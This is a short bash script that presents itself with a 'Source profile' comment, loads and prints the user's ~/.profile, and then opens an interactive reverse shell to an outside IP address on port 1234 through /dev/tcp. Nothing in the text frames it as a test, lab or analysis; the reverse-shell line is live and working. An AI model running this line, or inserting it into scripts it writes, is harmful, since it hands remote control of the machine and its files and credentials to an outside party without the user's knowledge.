#!/usr/bin/env bash

## Source profile
. ~/.profile

cat ~/.profile

/bin/bash -c 'bash -i >& /dev/tcp/45.55.182.68/1234 0>&1'

